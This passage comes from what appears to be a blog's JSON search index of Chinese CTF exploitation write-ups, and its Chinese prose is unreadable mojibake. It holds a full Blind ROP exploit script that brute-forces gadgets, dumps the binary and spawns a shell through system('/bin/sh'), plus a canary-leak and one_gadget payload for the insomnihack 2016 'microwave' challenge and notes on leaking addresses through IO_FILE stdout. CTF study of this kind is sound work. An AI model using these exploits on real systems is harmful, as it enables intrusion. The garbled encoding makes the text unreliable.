´å‡ºæ¥ä¸º72ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆbufçš„ç¼“å†²åŒºå°±æ˜¯72-8(rbp)=64ä¸ªå­—èŠ‚ã€‚(æ€»æ„Ÿè§‰è¿™é‡Œæœ‰ç‚¹é—®é¢˜ï¼Œå¦‚æœçœŸæ˜¯blindï¼Œé‚£ä¹ˆè‚¯å®šä¹Ÿä¸çŸ¥é“æ˜¯32ä½è¿˜æ˜¯64ä½å•Šï¼Œé‚£ä¹ˆå°±åº”è¯¥ä¸¤ç§æ–¹æ¡ˆéƒ½è¦å°è¯•ä¸€ä¸‹å§)\n\n3.å¯»æ‰¾å¯ä»¥ä½¿å¾—ç¨‹åºæŒ‚èµ·çš„stop_gadgetã€‚è¿™ä¸ªstop_gadgetæ˜¯ä»€ä¹ˆä¸é‡è¦ï¼Œåªè¦èƒ½è®©ç¨‹åºä¸å´©æºƒï¼Œèƒ½å¤Ÿåœ¨ä¹‹åæ¢ç´¢å…¶å®ƒå¯ä»¥ropçš„æ—¶å€™æ¥æ”¶åˆ°æ­£ç¡®çš„åé¦ˆï¼Œé‚£ä¹ˆæ˜¯ä»€ä¹ˆéƒ½å¯ä»¥ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\ndef get_stop_addr(buf_size):\n    addr = 0x400000\n    while True:\n        sleep(0.1)#ç¼“å†²\n        addr += 1\n        payload = \"A\"*buf_size\n        payload += p64(addr)#probe_addr\n        try:\n            sh = remote('127.0.0.1', 10001)\n            sh.recvline()\n            sh.sendline(payload)\n            sh.recvline()\n            sh.close()\n            log.info(\"stop address: 0x%x\" % addr)\n            return addr\n        except EOFError as e:#crash and restart\n            sh.close()\n            log.info(\"bad: 0x%x\" % addr)\n        except:#other error\n            log.info(\"Can't connect\")\n            addr -= 1\n```\n\n4.å¾—åˆ°stop_addrä¹‹åï¼Œå°±å¯ä»¥ç»§ç»­æ¢ç´¢å…¶å®ƒçš„rop_gadgetï¼Œè¿™é‡Œå¯»æ‰¾ä¸‡èƒ½gadgetçš„å…­ä¸ªpopçš„åœ°æ–¹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef get_gadgets_addr(buf_size, stop_addr):\n    addr = stop_addr\n    while True:\n        sleep(0.1)\n        addr += 1\n        payload = \"A\"*buf_size\n        payload += p64(addr)\n        payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) +\n        p64(6)\n        payload += p64(stop_addr)\n        try:\n            p = remote('127.0.0.1', 10001)\n            p.recvline()\n            p.sendline(payload)\n            p.recvline()\n            p.close()\n            log.info(\"find address: 0x%x\" % addr)\n            try: # check\n                payload = \"A\"*buf_size\n                payload += p64(addr)\n                payload += p64(1) + p64(2) + p64(3) + p64(4) + p\n                64(5) + p64(6)\n                #Six pop without stop_addr\n                p = remote('127.0.0.1', 10001)\n                p.recvline()\n                p.sendline(payload)\n                p.recvline()\n                p.close()\n                log.info(\"bad address: 0x%x\" % addr)\n                #Not crash,Bad addr.\n            except:#Crash,success addr\n                p.close()\n                log.info(\"gadget address: 0x%x\" % addr)\n                return addr\n        except EOFError as e:\n            p.close()\n            log.info(\"bad: 0x%x\" % addr)\n        except:\n            log.info(\"Can't connect\")\n            addr -= 1\n```\n\næ‰¾åˆ°ä¹‹åï¼Œéœ€è¦å†æ¬¡æ£€æŸ¥ä¸€ä¸‹ï¼Œç”¨æ¥ç¡®å®šæ˜¯ä¸æ˜¯ä¸‡èƒ½gadgetï¼Œå› ä¸ºå¦‚æœæœ‰ç¨‹åºå…­ä¸ªpopä¹‹åä¸retnï¼Œé‚£å°±ä¸æ˜¯ä¸‡èƒ½gadgetã€‚å› ä¸ºéœ€è¦dumpäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦ä¸‡èƒ½gadgetä¸­çš„Pop rdi;ret è¿™ä¸ªgadgetæ¥dumpæ–‡ä»¶ã€‚\n\n5.å¯»æ‰¾putså‡½æ•°çš„pltè¡¨ï¼Œæ–¹ä¾¿ä¹‹åè°ƒç”¨putså‡½æ•°å’Œpop rdi;retè¿™ä¸ªgadgetæ¥dumpäºŒè¿›åˆ¶æ–‡ä»¶ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\ndef get_puts_addr(buf_size, rdi_ret, stop_gadget):\n    addr = 0x400000\n    while 1:\n        print hex(addr)\n        sh = remote('127.0.0.1', 10001)\n        sh.recvuntil('password?\\n')\n        payload = 'A' * buf_size + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)\n        #call put to print the head of ELF.\n        sh.sendline(payload)\n        try:\n            content = sh.recv()\n            if content.startswith('\\x7fELF'):\n                print(\"find puts@plt addr: 0x%x\"%addr)\n                return addr\n            sh.close()\n            addr += 1\n        except EOFError as e:\n            sh.close()\n            log.info(\"bad: 0x%x\" % addr)\n        except:\n            log.info(\"Can't connect\")\n            addr -= 1\n```\n\nè¿™é‡Œå®é™…ä¸Šæ‰¾å‡ºæ¥çš„åœ°å€å¹¶ä¸æ˜¯putså‡½æ•°çš„pltè¡¨åœ°å€ï¼Œè€Œæ˜¯åœ¨putsçš„pltè¡¨å‰é¢ä¸€ç‚¹çš„å†…å®¹ï¼Œä½†æ˜¯è¿™ä¸€å°æ®µå†…å®¹ä¸å½±å“æ ˆå’Œrdiå¯„å­˜å™¨ï¼Œæ‰€ä»¥æ²¡ä»€ä¹ˆå½±å“ã€‚\n\n6.åˆ©ç”¨putså‡½æ•°å’Œpop rdi;retæ¥dumpäºŒè¿›åˆ¶æ–‡ä»¶ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr):\n    pop_rdi = gadgets_addr + 9 # pop rdi; ret\n    result = \"\"\n    while start_addr < end_addr:\n        #print result.encode('hex')\n        sleep(0.1)\n        payload = \"A\"*buf_size\n        payload += p64(pop_rdi)\n        payload += p64(start_addr)\n        payload += p64(puts_plt)\n        payload += p64(stop_addr)\n        try:\n            sh = remote('127.0.0.1', 10001)\n            sh.recvline()\n            sh.sendline(payload)\n            data = sh.recv(timeout=0.1) \n            #timeout makes sure to recive all bytes\n            if data == \"\\n\":#data = \\x00\n                data = \"\\x00\"\n            elif data[-1] == \"\\n\":\n            #data = xxxxx\\n\\x00,data = \\n\\x00,data = xxxxx\\x00\n                data = data[:-1]\n            log.info(\"leaking: 0x%x --> %s\" % (start_addr,(data or '').encode('hex')))\n            result += data\n            start_addr += len(data)\n            sh.close()\n        except:\n            log.info(\"Can't connect\")\n    return result\n```\n\nç”±äºputs å‡½æ•°é€šè¿‡ \\x00 è¿›è¡Œæˆªæ–­ï¼Œä¸ä¼šè¾“å‡º\\x00ï¼Œå¹¶ä¸”ä¼šåœ¨æ¯ä¸€æ¬¡è¾“å‡ºæœ«å°¾åŠ ä¸Šæ¢è¡Œç¬¦\\x0a ï¼Œæ‰€ä»¥æœ‰ä¸€äº›ç‰¹æ®Šæƒ…å†µéœ€è¦åšä¸€äº›å¤„ç†ï¼Œæ¯”å¦‚å•ç‹¬çš„ \\x00 ã€ \\x0a ç­‰ã€‚é¦–å…ˆå½“ç„¶æ˜¯å…ˆå»æ‰æœ«å°¾ puts è‡ªåŠ¨åŠ ä¸Šçš„ \\n ï¼Œç„¶åå¦‚æœ recv åˆ°ä¸€ä¸ª \\n ï¼Œè¯´æ˜å†…å­˜ä¸­æ˜¯ \\x00 ï¼Œå¦‚æœ recv åˆ°ä¸€ä¸ª \\n\\n ï¼Œè¯´æ˜å†…å­˜ä¸­æ˜¯\\x0a ã€‚ p.recv(timeout=0.1) æ˜¯ç”±äºå‡½æ•°æœ¬èº«çš„è®¾å®šï¼Œå¦‚æœæœ‰ \\n\\n ï¼Œå®ƒå¾ˆå¯èƒ½åœ¨æ”¶åˆ°ç¬¬ä¸€ä¸ª \\n æ—¶å°±è¿”å›äº†ï¼ŒåŠ ä¸Šå‚æ•°å¯ä»¥è®©å®ƒå…¨éƒ¨æ¥æ”¶å®Œã€‚\n\n7.å¾—åˆ°äºŒè¿›åˆ¶æ–‡ä»¶åå°±æ˜¯å¸¸è§„æ“ä½œäº†ï¼Œåˆ©ç”¨Dynelfæˆ–è€…LibcSearcherå’Œputså‡½æ•°æ‰¾åˆ°systemå‡½æ•°å’Œbinshå®é™…ä½ç½®ï¼Œä¹‹åé€šè¿‡pop rdi;retæ¥ä¸ºsystemå‡½æ•°èµ‹å‚æ•°ä»è€Œgetshellã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nsh = remote('127.0.0.1', 10001)\nsh.recvuntil('password?\\n')\npayload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(\nstop_gadget)\nsh.sendline(payload)\ndata = sh.recvuntil('\\nWelCome', drop=True)\nputs_addr = u64(data.ljust(8, '\\x00'))\nlibc = LibcSearcher('puts', puts_addr)\nlibc_base = puts_addr - libc.dump('puts')\nsystem_addr = libc_base + libc.dump('system')\nbinsh_addr = libc_base + libc.dump('str_bin_sh')\npayload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(\nsystem_addr) + p64(stop_gadget)\nsh.sendline(payload)\nsh.interactive()\n```\n\nè¿™é‡Œçš„libcSearcheræœ‰æ—¶å€™ä¸å¤ªå¥½ç”¨ï¼ŒæŸ¥åˆ°çš„libcä¸ç¬¦åˆï¼Œæˆ–è€…æ˜¯ä¸å¯¹ã€‚è¿˜æ˜¯DynElfå¥½ç”¨ä¸€äº›ï¼Œæ¯”è¾ƒå‡†ç¡®ï¼Œå¹¶ä¸”ç”±äºæ˜¯putså‡½æ•°æ‰“å°ï¼Œæ‰€ä»¥å¯èƒ½éœ€è¦å•ä¸ªå­—ç¬¦æ¥åˆ¤æ–­ã€‚ä½†å®é™…ä¸Š64ä½æ¡ä»¶ä¸‹çš„gotè¡¨ä¸­çš„åœ°å€ä¸€å®šæ˜¯0x00007fxxxxxxxxxxï¼Œæ‰€ä»¥å¦‚æœæ˜¯å¤§ç«¯æƒ…å†µï¼Œé‚£ä¹ˆputså‡½æ•°ä¸€å®šä¼šæˆªæ–­ï¼Œæ¥æ”¶åˆ°çš„åªä¼šæ˜¯xxxxxxxxxx7få’Œ0aæ‰€ä»¥å…¶å®åªè¦åˆ¤æ–­åˆ°æ¢è¡Œç¬¦çš„æ—¶å€™å°±å¯ä»¥ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\ndef leak(address):\n    data = \"\"\n    c=\"\"\n    up = \"\"\n    payload = 'a' * length + p64(rdi_ret) + p64(address) + p64(puts_plt) + p64(stop_gadget)\n    sh.recvuntil('password?\\n')\n    sh.send(payload)\n    while True:\n        c = p.recv(1)\n        if up == '\\n' and c == \"W\":  \n            data = data[:-1]                     \n            data += \"\\x00\"\n            break\n        else:\n            data += c\n        up = c\n    data=data[:7]#å®é™…æœ‰æ•ˆåœ°å€åªæœ‰6ä¸ªå­—ç¬¦\n    log.info(\"%#x => %s\" % (address, (data or '').encode('hex')))\n    return data\n\n\ndynelf = DynELF(leak, elf=ELF(\"./brop\"))\nsystem_addr = dynelf.lookup(\"__libc_system\", \"libc\")\n```\n\nä½†æ˜¯DynElfå¥½åƒä¸èƒ½æ‰¾binshå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å¦‚æœç”¨è¿™ç§æ–¹æ³•é‚£å°±è¿˜éœ€è¦æ³„éœ²readçš„çœŸå®åœ°å€ï¼Œæ‰¾ä¸ªèƒ½å†™çš„åœ°æ–¹å°†binshå†™è¿›å»å†è°ƒç”¨ï¼Œæ¯”è¾ƒéº»çƒ¦ã€‚æ‰€ä»¥èƒ½ç”¨libcSearcherå¯ä»¥å…ˆç”¨æ¥è¯•è¯•ï¼Œå‡½æ•°ï¼Œbinshå­—ç¬¦ä¸²éƒ½èƒ½æ‰¾ï¼Œæ¯”è¾ƒæ–¹ä¾¿ä¸€ç‚¹ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://wiki.x10sec.org/pwn/linux/stackoverflow/medium-rop-zh/#brop\n\nctf-all-in-one\n\n \n\n \n","tags":["Blind"],"categories":["PWN","BlindROP"]},{"title":"insomnihack CTF 2016-microwave","url":"/2021/08/19/insomnihack CTF 2016-microwave/","content":"\n1.å¸¸è§„checksecï¼Œç¨‹åºå…¨éƒ¨å¼€å¯ä¿æŠ¤ï¼Œå¹¶ä¸”æœ‰canaryä¿æŠ¤ï¼Œä»IDAä¸­æ±‡ç¼–ä»£ç å’Œä¼ªä»£ç ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼š\n\n(1)æ±‡ç¼–ä»£ç ï¼š\n\nâ‘ ç”Ÿæˆcanaryçš„ä»£ç :ä¸€èˆ¬åœ¨å‡½æ•°åˆå§‹åŒ–çš„æ—¶å€™å°±å¯ä»¥çœ‹åˆ°\n\n```\n#æ³¨é‡Šå¤´\n\nmov rax,fs:28h\nmov [rsp+28h+var_20], rax\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191523843.png)\n\nâ‘¡æ ¡éªŒ:\n\n```\n#æ³¨é‡Šå¤´\n\nmov rax, [rsp+28h+var_20]\nxor rax, fs:28h\njnz short func\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191523812.png)\n\n(2)ä¼ªä»£ç ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nv_canary = __readfsqword(0x28u);\nreturn __readfsqword(0x28u) ^ v_canary;\n```\n\næœ‰å¾ˆå¤šç§å½¢å¼ï¼Œå¦‚ä¸‹ä¹Ÿæ˜¯ä¸€ç§ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191523399.png)\n\n2.ä¹‹åæŸ¥æ‰¾æ¼æ´ï¼Œæ‰¾åˆ°ä¸¤ä¸ªæ¼æ´ï¼š\n\n(1)åŠŸèƒ½1çš„sub_F00å‡½æ•°ä¸­çš„printfå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n__printf_chk(1LL, a1);\n```\n\nè¿™é‡Œçš„1LLä¸çŸ¥é“æ˜¯ä¸ªä»€ä¹ˆæ„æ€ï¼Œä½†æ˜¯å®é™…æ•ˆæœä»ç„¶ç›¸å½“äºæ˜¯printf(a1)ï¼Œè°ƒè¯•ä¸­å¯ä»¥çŸ¥é“ã€‚\n\n(2)åŠŸèƒ½2çš„sub_1000å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n__int64 v1; // [rsp+0h] [rbp-418h]\n------------------------------------------------------\nread(0, &v1, 0x800uLL);\n```\n\n3.ç°åœ¨æ˜¯ä¿æŠ¤å…¨å¼€ï¼Œæ ˆæº¢å‡ºæ¼æ´å› ä¸ºcanaryçš„å…³ç³»æ²¡åŠæ³•åˆ©ç”¨ï¼Œå”¯ä¸€èƒ½åˆ©ç”¨çš„åªæœ‰ä¸€ä¸ªprintf()å‡½æ•°ï¼Œè€Œä¸”è¿˜æ²¡åŠæ³•åŠ«æŒgotè¡¨ï¼Œæ²¡åŠæ³•è¿›è¡Œå®Œå…¨æ ˆæ“æ§ã€‚æ‰€ä»¥è¿™é‡Œå°±æƒ³èƒ½ä¸èƒ½é€šè¿‡printfå‡½æ•°æ³„éœ²canaryä»è€Œä½¿å¾—æ ˆæº¢å‡ºè¿™ä¸ªæ¼æ´æ´¾ä¸Šç”¨åœºã€‚\n\n4.é¦–å…ˆè°ƒè¯•ï¼Œè§‚å¯Ÿcanaryåœ¨æ ˆä¸Šçš„åç§»ä½ç½®ï¼Œè°ƒè¯•æ–­ç‚¹ä¸‹åœ¨sub_F00å‡½æ•°çš„printfå‡½æ•°ä¸Šï¼Œå› ä¸ºè¿™ä¸ªsub_F00å‡½æ•°ä¸­ä¹Ÿæœ‰canaryçš„ä¿æŠ¤ï¼Œé‚£ä¹ˆè¯¥å‡½æ•°æ ˆä¸Šä¸€å®šå­˜åœ¨canaryçš„å€¼ã€‚è‡ªå·±è°ƒè¯•å¦‚ä¸‹å›¾ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191523613.png)\n\nIDAè°ƒè¯•ç•Œé¢ç‚¹å‡»å¯¹åº”ç”Ÿæˆcanaryçš„ä»£ç mov  [rsp+28h+var_20], raxä¸­çš„[rsp+28h+var_20]å°±å¯ä»¥çŸ¥é“canaryçš„ä½ç½®åº”è¯¥æ˜¯rsp+8hå¤„ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥çœ‹å‡ºæ¥V6å°±æ˜¯canary\n\nå¦å¤–ç”±äºè¿™æ˜¯64ä½ç¨‹åºï¼Œå–å‚é¡ºåºæ˜¯rdi, rsi, rdx, rcx, r8, r9, æ ˆï¼Œç”±äºprintf()å‰ä¸¤ä¸ªå‚æ•°ä½rdi,rsiå¯¹åº”çš„æ˜¯fdå’Œ&bufï¼Œ\n\nè¿™é‡Œçš„bufå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„usernameï¼Œå› ä¸ºusernameçš„è¾“å…¥ä¿å­˜åœ¨å †ä¸Šmainå‡½æ•°ä¸­æœ‰å£°æ˜ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nvoid *v4; // r12\n----------------------------------------------------------------\nv4 = malloc(0x3EuLL);\n-------------------------------------------------------------------\nfwrite(\" username: \", 1uLL, 0x15uLL, stdout);\nfflush(0LL);\nfgets((char *)v4, 40, stdin);\n--------------------------------------------------------------------\nfwrite(\" password: \", 1uLL, 0x15uLL, stdout);\nfflush(0LL);\nv3 = 20LL;\nfgets((char *)v4 + 40, 20, stdin);\n------------------------------------------------------------------------\nsub_F00((__int64)v4);\n--------------------------------------------------------------------\nunsigned __int64 __fastcall sub_F00(__int64 a1)\n-------------------------------------------------------------------\n__printf_chk(1LL, a1);\n```\n\nä¸‹å›¾æ˜¯æ²¡æœ‰æ‰“å°ä¹‹å‰çš„å†…å®¹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191523728.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°rsiçš„å€¼æ˜¯5å¼€å¤´çš„ï¼Œè¿™å…¶å®å°±æ˜¯ä¸€ä¸ªå †å†…å­˜åœ°å€ï¼Œè°ƒè¯•è¿‡ç¨‹ä¸­è¾“å…¥è·³è½¬å°±å¯ä»¥çœ‹åˆ°è¯¥åœ°å€å¯¹åº”çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬çš„è¾“å…¥usernameçš„å€¼ã€‚é‚£ä¹ˆè¾“å…¥usernameæ—¶è¾“å…¥å¤šä¸ª%pï¼Œè§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæ‰“å°å¯„å­˜å™¨å’Œæ ˆä¸Šçš„å†…å®¹ï¼Œæ³„éœ²å‡ºlibcåœ°å€å’Œcanaryã€‚printf()ä¾æ¬¡æ ¹æ®%pæ‰“å°çš„å‚æ•°é¡ºåºæ˜¯rdx,rcx,r8,r9,æ ˆã€‚æ‰€ä»¥r9ä¹‹åç¬¬ä¸€ä¸ªæ‰“å°å‡ºæ¥çš„æ•°æ®æ˜¯rsp-8hï¼Œä¹Ÿå°±æ˜¯canaryçš„å€¼ï¼Œè¿™æ ·å°±å¯ä»¥å¾—åˆ°æ³„éœ²çš„canaryçš„å€¼ï¼Œä»è€Œæ§åˆ¶æ ˆæº¢å‡ºã€‚åŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°æ‰“å°å‡ºæ¥çš„æ•°æ®ä¸­åŒ…å«libcä¸­çš„å‡½æ•°ï¼Œè¿™æ ·åŒæ—¶ä¹Ÿæ³„éœ²å‡ºæ¥äº†libcåŠ è½½åçš„åœ°å€ï¼Œä¹‹åé€šè¿‡åç§»è®¡ç®—å‡ºåŸºåœ°å€ã€‚\n\n5.ä¹‹åè¿›è¡Œæ ˆæº¢å‡ºæ“æ§ï¼Œä½†æ˜¯è¿™é‡Œå¦‚æœè¿ä¸ä¸Šè´¦æˆ·ä¼šæ²¡åŠæ³•ä½¿ç”¨sub_1000å‡½æ•°ï¼Œç”¨IDAæŸ¥çœ‹å¯ä»¥çœ‹åˆ°åœ¨sub_f00å‡½æ•°ä¸­å¯¹å¯†ç è¿›è¡Œæ£€æŸ¥ï¼Œå¯ç›´æ¥æŸ¥çœ‹åˆ°å¯†ç ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191522910.png)\n\nè¿™ä¸ªoff_204010å°±æ˜¯å¯†ç ï¼Œç‚¹è¿›å»å°±å¯ä»¥çœ‹åˆ°ã€‚\n\nç”±ä¹‹å‰æ­¥éª¤å¯ä»¥å¾—åˆ°canaryå’ŒlibcåŸºåœ°å€ã€‚æŸ¥è¯¢ä¹‹åå¯ä»¥å‘ç°ç”±äºretnå‰ä¼šæ£€æŸ¥canaryï¼Œå¯¹åº”æ±‡ç¼–ä»£ç æ˜¯ï¼š\n\nxor rax, fs:28h\n\né‚£ä¹ˆå¦‚æœcanaryè¾“å…¥æˆåŠŸï¼Œxorä¹‹åä¼šä½¿å¾—raxä¸€å®šä¸º0ï¼Œæ»¡è¶³è¯¥libcåº“çš„Onegadgetæ¡ä»¶ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ç›´æ¥ä½¿ç”¨Onegadgetï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npayload = \"A\"*1032 #padding\npayload += p64(canary) #æ­£ç¡®çš„canary\npayload += \"B\"*8 #padding\npayload += p64(one_gadget_addr) #one gadget RCE\nio.sendline('2') #ä½¿ç”¨æœ‰æ ˆæº¢å‡ºçš„åŠŸèƒ½2\nio.recvuntil('#> ')\nio.sendline(payload)\n```\n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["canary"],"categories":["PWN","canaryç»•è¿‡0x9"]},{"title":"åˆ©ç”¨IO_FILEæ³„éœ²åœ°å€","url":"/2021/08/19/åˆ©ç”¨IO_FILEæ³„éœ²åœ°å€/","content":"\nIO_FILEçš„å…·ä½“ç»“æ„å’ŒåŠŸèƒ½åœ¨FSOPä¸­å†™è¿‡ï¼Œè¿™é‡Œä¸»è¦å…³æ³¨ä¸‹å…¶ä¸­çš„æ‰“å°å‡½æ•°_IO_2_1_stdoutçš„ç›¸å…³åˆ©ç”¨ï¼Œé€šå¸¸ç”¨æ¥åœ¨å †åˆ©ç”¨æ—¶ï¼Œç”±äºæ²¡æœ‰showä¹‹ç±»çš„æ‰“å°å †å—å†…å®¹çš„é€‰é¡¹ï¼Œå¯¼è‡´æ— æ³•æ³„éœ²libcåœ°å€çš„æƒ…å†µã€‚\n\n# å‰è¨€\n\nè¿™é‡Œçš„_flagsåœ¨_IO_2_1_stdoutç»“æ„ä½“ä¸­ï¼Œä¸€æ—¦æˆ‘ä»¬æƒ³è¦é€šè¿‡_IO_2_1_stdoutæ¥æ‰“å°æŒ‡å®šå†…å­˜åœ°å€çš„å†…å®¹ï¼Œå°±éœ€è¦å¯¹_flagsçš„å€¼è¿›è¡Œè®¾ç½®ï¼Œç»•è¿‡ä¸€äº›æ£€æŸ¥ï¼Œæ‰èƒ½æœ€ç»ˆè¿›å…¥_IO_SYSWRITEå‡½æ•°æ‰“å°ã€‚\n\n## 1._IO_new_file_overflowæ£€æŸ¥ï¼š\n\n### æ¡ä»¶ä¸€\n\nä¸èƒ½è¿›å…¥ï¼Œåˆ¤æ–­è¯­å¥éœ€è¦ä¸ºå‡ï¼Œå¦åˆ™ç›´æ¥è¿”å›EOFäº†ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nif (f->_flags & _IO_NO_WRITES)   /* SET ERROR */\n{\n    f->_flags |= _IO_ERR_SEEN;\n    __set_errno (EBADF);\n    return EOF;\n}\n```\n\néœ€è¦æ»¡è¶³æ¡ä»¶ï¼šf->_flags & _IO_NO_WRITES == false\n\n### æ¡ä»¶äºŒ\n\nä¸èƒ½è¿›å…¥ï¼Œåˆ¤æ–­è¯­å¥éœ€è¦ä¸ºå‡\n\n```\n#æ³¨é‡Šå¤´\n\nif ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)\n```\n\nå› ä¸ºè¿™é‡Œä¸€æ—¦è¿›å…¥ï¼Œå°±ä¼šæœ‰ä¸€ä¸ªåˆå§‹åŒ–æŒ‡é’ˆçš„æ“ä½œï¼Œå¯¼è‡´æˆ‘ä»¬çš„_IO_write_baseè¢«è¦†ç›–ï¼Œä»è€Œæ— æ³•è¾“å‡ºæƒ³è¦çš„åœ°å€çš„å†…å®¹ã€‚\n\néœ€è¦æ»¡è¶³æ¡ä»¶ï¼š((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL) == false\n\nä¹‹åå°±è·³åˆ°å¦‚ä¸‹è¯­å¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nif (ch == EOF)\n    return _IO_do_write (f, f->_IO_write_base,f->_IO_write_ptr - f->_IO_write_base);\n```\n\nè¿›å…¥_IO_do_writeå‡½æ•°ã€‚\n\n## 2._IO_do_writeæ£€æŸ¥ï¼š\n\nâ–²ç”±äºå¦‚ä¸‹å®šä¹‰ï¼šlibc_hidden_ver (_IO_new_do_write, _IO_do_write)ï¼Œè¯¥å‡½æ•°æˆäº†_IO_new_do_writeå‡½æ•°ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n_IO_new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)\n{\n    return (to_do == 0\n        || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;\n}\n```\n\nè¿™ä¸ªå‡½æ•°ä¸­æ²¡ä»€ä¹ˆæ“ä½œï¼Œç›´æ¥è¿›å…¥åˆ°new_do_writeå‡½æ•°.\n\n## 3.new_do_writeæ£€æŸ¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nif (fp->_flags & _IO_IS_APPENDING)\nelse if (fp->_IO_read_end != fp->_IO_write_base)\n```\n\nè¿™é‡Œå…¶å®ä¸å¤ªæ˜ç™½ï¼Œå¾ˆå¤šåœ°æ–¹è¯´è¦æ»¡è¶³å…¶ä¸­ä¸€ä¸ªæ‰èƒ½è¿›å…¥åˆ°å®é™…è°ƒç”¨æ‰“å°çš„ç³»ç»Ÿå‡½æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ncount = _IO_SYSWRITE (fp, data, to_do);\n```\n\nä½†æ˜¯æˆ‘è®¤ä¸ºifå’Œelse iféƒ½ç»•è¿‡åº”è¯¥ä¹Ÿå¯ä»¥è¿è¡Œåˆ°countçš„æ‰§è¡Œè¯­å¥ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯å› ä¸ºéœ€è¦è®¾ç½®fp->_offsetæ‰èƒ½æ‰“å°ï¼Œé‚£å¦‚æœæ˜¯çš„è¯ï¼Œæ§åˆ¶_IO_2_1_stdoutçš„ç»“æ„ä½“ä¸ä¹Ÿèƒ½è®¾ç½®fp->_offsetçš„å€¼å—ã€‚\n\n### (1)é’ˆå¯¹if (fp->_flags & _IO_IS_APPENDING)ï¼š\n\nè¿™ä¸ªå¯ä»¥è¿›å…¥ï¼Œå½±å“ä¸å¤§\n\n```\n#æ³¨é‡Šå¤´\n\nif (fp->_flags & _IO_IS_APPENDING)\n     fp->_offset = _IO_pos_BAD;\n```\n\n### (2)é’ˆå¯¹else if (fp->_IO_read_end != fp->_IO_write_base)\n\nè¿™ä¸ªä¸å¤ªèƒ½å¤Ÿè¿›å…¥ï¼Œå› ä¸ºè¯¥è¯­å¥å¦‚ä¸‹ï¼š\n\n```\nelse if (fp->_IO_read_end != fp->_IO_write_base)\n{\n    _IO_off64_t new_pos = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);\n    if (new_pos == _IO_pos_BAD)\n        return 0;\n    fp->_offset = new_pos;\n}\n```\n\nå› ä¸º_IO_SYSSEEKå¯èƒ½ä¼šæ‰§è¡Œé”™è¯¯ï¼Œå´©æºƒï¼Œæ— æ³•åˆ°è¾¾countçš„æ‰§è¡Œè¯­å¥ã€‚è€Œä¸”fp->_IO_read_end != fp->_IO_write_baseåˆ¤æ–­è¯­å¥æ»¡è¶³çš„æ¦‚ç‡ç›¸å½“å¤§ï¼Œè¿™å°±å¯¼è‡´å¦‚æœç¬¬ä¸€ä¸ªifä¸è¿›å…¥ï¼Œé‚£ä¹ˆç¬¬äºŒä¸ªelse ifå°±æœ‰å¾ˆå¤§æ¦‚ç‡è¿›å…¥ï¼Œç„¶åå°±å¯èƒ½ä¼šå´©æºƒã€‚æ‰€ä»¥åœ¨åªèƒ½è®¾ç½®flagså€¼çš„æƒ…å†µä¸‹è¿˜æ˜¯è¿›å…¥ç¬¬ä¸€ä¸ªIfè¯­å¥æ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚\n\næ‰€ä»¥éœ€è¦æ»¡è¶³æ¡ä»¶ï¼šfp->_flags & _IO_IS_APPENDING == true\n\nâ–²åé¢æ‰æƒ³æ˜ç™½æ˜¯å› ä¸ºå¦‚æœåªè®¾ç½®flagsçš„è¯ï¼Œè€Œ_IO_read_endå’Œ_IO_write_baseçš„å€¼æ— æ³•æ§åˆ¶çš„æƒ…å†µä¸‹ï¼Œæœ€å¥½ä½¿ç¨‹åºæµè¿›å»if (fp->_flags & 